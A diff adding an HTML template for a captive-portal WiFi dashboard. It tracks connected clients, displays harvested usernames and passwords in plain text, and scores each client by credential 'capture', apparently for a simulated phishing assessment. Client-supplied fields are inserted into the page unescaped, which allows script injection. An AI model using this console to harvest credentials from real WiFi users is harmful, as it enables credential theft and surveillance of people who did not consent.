@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📡 WiFi Monitor — {{ ssid }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a1a;
+            --card: #111827;
+            --border: #1e293b;
+            --text: #e2e8f0;
+            --dim: #64748b;
+            --accent: #3b82f6;
+            --green: #22c55e;
+            --yellow: #eab308;
+            --red: #ef4444;
+            --purple: #a855f7;
+            --cyan: #06b6d4;
+        }
+        body {
+            font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        .header .live {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--green);
+        }
+        .header .live .dot {
+            width: 8px;
+            height: 8px;
+            background: var(--green);
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .stat-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+        }
+        .stat-card .label {
+            font-size: 11px;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: 700;
+        }
+        .stat-card .sub {
+            font-size: 12px;
+            color: var(--dim);
+            margin-top: 4px;
+        }
+        .c-blue { color: var(--accent); }
+        .c-green { color: var(--green); }
+        .c-yellow { color: var(--yellow); }
+        .c-red { color: var(--red); }
+        .c-purple { color: var(--purple); }
+        .c-cyan { color: var(--cyan); }
+
+        /* Score Bar */
+        .total-score-bar {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        .total-score-bar .title {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        .total-score-bar .title span:first-child {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .total-score-bar .title span:last-child {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--cyan);
+        }
+        .progress-outer {
+            height: 12px;
+            background: #1e293b;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        .progress-inner {
+            height: 100%;
+            border-radius: 6px;
+            transition: width 0.5s ease;
+        }
+
+        /* Distribution */
+        .dist-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .dist-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+        }
+        .dist-card h3 {
+            font-size: 13px;
+            color: var(--dim);
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .dist-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+            font-size: 13px;
+        }
+        .dist-bar {
+            height: 4px;
+            background: #1e293b;
+            border-radius: 2px;
+            margin-top: 4px;
+            overflow: hidden;
+        }
+        .dist-bar-fill {
+            height: 100%;
+            border-radius: 2px;
+            background: var(--accent);
+        }
+
+        /* Client Table */
+        .table-container {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+        .table-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+        .table-header h2 {
+            font-size: 15px;
+            font-weight: 600;
+        }
+        .table-header .count {
+            font-size: 12px;
+            color: var(--dim);
+            background: #1e293b;
+            padding: 4px 10px;
+            border-radius: 6px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th {
+            text-align: left;
+            padding: 10px 16px;
+            font-size: 11px;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid var(--border);
+            background: rgba(15, 23, 42, 0.5);
+        }
+        td {
+            padding: 12px 16px;
+            font-size: 13px;
+            border-bottom: 1px solid var(--border);
+            vertical-align: top;
+        }
+        tr:hover td {
+            background: rgba(59, 130, 246, 0.05);
+        }
+        .mac { color: var(--cyan); font-family: monospace; }
+        .ip { color: var(--yellow); font-family: monospace; }
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge-green { background: rgba(34, 197, 94, 0.15); color: var(--green); }
+        .badge-red { background: rgba(239, 68, 68, 0.15); color: var(--red); }
+        .badge-yellow { background: rgba(234, 179, 8, 0.15); color: var(--yellow); }
+        .badge-purple { background: rgba(168, 85, 247, 0.15); color: var(--purple); }
+
+        /* Score visual */
+        .score-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .score-high { background: rgba(239, 68, 68, 0.15); color: var(--red); }
+        .score-med { background: rgba(234, 179, 8, 0.15); color: var(--yellow); }
+        .score-low { background: rgba(34, 197, 94, 0.15); color: var(--green); }
+
+        /* Creds table */
+        .creds-row {
+            font-size: 12px;
+            color: var(--red);
+            margin-top: 4px;
+        }
+
+        /* Timeline */
+        .interactions {
+            font-size: 11px;
+            color: var(--dim);
+            max-height: 80px;
+            overflow-y: auto;
+        }
+        .interactions div {
+            padding: 2px 0;
+            border-left: 2px solid var(--border);
+            padding-left: 8px;
+            margin: 2px 0;
+        }
+
+        /* Expanded row */
+        .expand-btn {
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--dim);
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .expand-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .detail-row { display: none; }
+        .detail-row.open { display: table-row; }
+        .detail-cell {
+            padding: 16px;
+            background: rgba(15, 23, 42, 0.7);
+        }
+        .detail-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .detail-item {
+            font-size: 12px;
+        }
+        .detail-item .k { color: var(--dim); margin-bottom: 2px; }
+        .detail-item .v { color: var(--text); word-break: break-all; }
+
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 11px;
+            color: var(--dim);
+        }
+
+        @media (max-width: 768px) {
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .dist-grid { grid-template-columns: 1fr; }
+            table { font-size: 11px; }
+            td, th { padding: 8px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>📡 {{ ssid }} — Monitor</h1>
+        <div class="live">
+            <div class="dot"></div>
+            <span>LIVE</span>
+            <span id="clock"></span>
+        </div>
+    </div>
+
+    <div class="stats-grid" id="statsGrid"></div>
+
+    <div class="total-score-bar" id="totalScoreBar"></div>
+
+    <div class="dist-grid" id="distGrid"></div>
+
+    <div class="table-container">
+        <div class="table-header">
+            <h2>🖥️ Connected Clients</h2>
+            <span class="count" id="clientCount">0 clients</span>
+        </div>
+        <div style="overflow-x: auto;">
+            <table>
+                <thead>
+                    <tr>
+                        <th></th>
+                        <th>MAC Address</th>
+                        <th>IP</th>
+                        <th>Device</th>
+                        <th>OS</th>
+                        <th>Portal</th>
+                        <th>Creds</th>
+                        <th>Score</th>
+                        <th>Last Seen</th>
+                    </tr>
+                </thead>
+                <tbody id="clientTable"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="footer">
+        Captive Portal WiFi Monitor — Auto-refresh 5s — Simulation Mode
+    </div>
+
+    <script>
+        function scoreClass(s) {
+            if (s >= 60) return 'score-high';
+            if (s >= 30) return 'score-med';
+            return 'score-low';
+        }
+
+        function gradientColor(pct) {
+            if (pct >= 70) return 'linear-gradient(90deg, #ef4444, #dc2626)';
+            if (pct >= 40) return 'linear-gradient(90deg, #eab308, #f59e0b)';
+            return 'linear-gradient(90deg, #22c55e, #16a34a)';
+        }
+
+        function timeAgo(ts) {
+            if (!ts) return '-';
+            const d = new Date(ts + 'Z');
+            const now = new Date();
+            const diff = Math.floor((now - d) / 1000);
+            if (diff < 60) return diff + 's ago';
+            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
+            return Math.floor(diff/3600) + 'h ago';
+        }
+
+        function renderStats(stats) {
+            document.getElementById('statsGrid').innerHTML = `
+                <div class="stat-card">
+                    <div class="label">Total Clients</div>
+                    <div class="value c-blue">${stats.total_clients}</div>
+                    <div class="sub">Connected devices</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Portal Visited</div>
+                    <div class="value c-green">${stats.portal_visited}</div>
+                    <div class="sub">${stats.visit_rate}% visit rate</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Credentials</div>
+                    <div class="value c-red">${stats.credentials_entered}</div>
+                    <div class="sub">${stats.cred_rate}% capture rate</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Avg Score</div>
+                    <div class="value c-yellow">${stats.avg_score}</div>
+                    <div class="sub">Per client</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Total Score</div>
+                    <div class="value c-cyan">${stats.total_score}</div>
+                    <div class="sub">All clients combined</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Max Score</div>
+                    <div class="value c-purple">${stats.max_score}</div>
+                    <div class="sub">Best capture</div>
+                </div>
+            `;
+
+            // Total score bar
+            const maxPossible = stats.total_clients * 100;
+            const pct = maxPossible > 0 ? Math.round(stats.total_score / maxPossible * 100) : 0;
+            document.getElementById('totalScoreBar').innerHTML = `
+                <div class="title">
+                    <span>📊 Overall Assessment Score</span>
+                    <span>${stats.total_score} / ${maxPossible} (${pct}%)</span>
+                </div>
+                <div class="progress-outer">
+                    <div class="progress-inner" style="width: ${pct}%; background: ${gradientColor(pct)}"></div>
+                </div>
+            `;
+
+            // Distribution
+            let osHtml = stats.os_distribution.map(o => {
+                const p = stats.total_clients > 0 ? Math.round(o.count / stats.total_clients * 100) : 0;
+                return `<div class="dist-item">
+                    <span>${o.os}</span><span>${o.count} (${p}%)</span>
+                </div>
+                <div class="dist-bar"><div class="dist-bar-fill" style="width:${p}%"></div></div>`;
+            }).join('');
+
+            let devHtml = stats.device_distribution.map(d => {
+                const p = stats.total_clients > 0 ? Math.round(d.count / stats.total_clients * 100) : 0;
+                return `<div class="dist-item">
+                    <span>${d.type}</span><span>${d.count} (${p}%)</span>
+                </div>
+                <div class="dist-bar"><div class="dist-bar-fill" style="width:${p}%; background: var(--purple)"></div></div>`;
+            }).join('');
+
+            document.getElementById('distGrid').innerHTML = `
+                <div class="dist-card"><h3>OS Distribution</h3>${osHtml}</div>
+                <div class="dist-card"><h3>Device Types</h3>${devHtml}</div>
+            `;
+        }
+
+        function renderClients(clients) {
+            document.getElementById('clientCount').textContent = clients.length + ' clients';
+            let html = '';
+            clients.forEach((c, i) => {
+                const portalBadge = c.portal_visited
+                    ? '<span class="badge badge-green">✓ Yes</span>'
+                    : '<span class="badge badge-red">✗ No</span>';
+                const credsBadge = c.credentials_entered
+                    ? '<span class="badge badge-purple">🔑 Captured</span>'
+                    : '<span class="badge badge-yellow">—</span>';
+
+                html += `<tr>
+                    <td><button class="expand-btn" onclick="toggleDetail(${i})">▶</button></td>
+                    <td class="mac">${c.mac}</td>
+                    <td class="ip">${c.ip}</td>
+                    <td>${c.device_type || '-'}<br><small style="color:var(--dim)">${c.hostname || ''}</small></td>
+                    <td>${c.os || '-'}</td>
+                    <td>${portalBadge}</td>
+                    <td>${credsBadge}</td>
+                    <td><span class="score-pill ${scoreClass(c.score)}">${c.score}</span></td>
+                    <td style="font-size:11px">${timeAgo(c.last_seen)}</td>
+                </tr>`;
+
+                // Detail row
+                let credsHtml = c.credentials.length > 0
+                    ? c.credentials.map(cr => `<div class="creds-row">🔑 ${cr.username} : ${cr.password} <small>(${cr.timestamp})</small></div>`).join('')
+                    : '<span style="color:var(--dim)">No credentials captured</span>';
+
+                let interHtml = c.interactions.slice(0, 10).map(int =>
+                    `<div>${int.timestamp?.split(' ')[1] || ''} — <strong>${int.action}</strong> ${int.url_requested || ''} ${int.details || ''}</div>`
+                ).join('');
+
+                html += `<tr class="detail-row" id="detail-${i}">
+                    <td colspan="9" class="detail-cell">
+                        <div class="detail-grid">
+                            <div class="detail-item">
+                                <div class="k">User Agent</div>
+                                <div class="v">${c.user_agent || '-'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="k">Accept-Language</div>
+                                <div class="v">${c.accept_language || '-'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="k">First Seen</div>
+                                <div class="v">${c.first_seen || '-'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="k">Credentials</div>
+                                <div class="v">${credsHtml}</div>
+                            </div>
+                        </div>
+                        <div style="margin-top:12px">
+                            <div class="k" style="color:var(--dim);margin-bottom:6px">Activity Timeline</div>
+                            <div class="interactions">${interHtml || '<div>No interactions</div>'}</div>
+                        </div>
+                    </td>
+                </tr>`;
+            });
+            document.getElementById('clientTable').innerHTML = html;
+        }
+
+        function toggleDetail(i) {
+            const row = document.getElementById('detail-' + i);
+            row.classList.toggle('open');
+        }
+
+        async function refresh() {
+            try {
+                const [statsRes, clientsRes] = await Promise.all([
+                    fetch('/api/stats'),
+                    fetch('/api/clients')
+                ]);
+                const stats = await statsRes.json();
+                const clients = await clientsRes.json();
+                renderStats(stats);
+                renderClients(clients);
+            } catch(e) {
+                console.error('Refresh failed:', e);
+            }
+        }
+
+        // Clock
+        setInterval(() => {
+            document.getElementById('clock').textContent = new Date().toLocaleTimeString();
+        }, 1000);
+
+        // Auto-refresh every 5s
+        refresh();
+        setInterval(refresh, 5000);
+    </script>
+</body>
+</html>
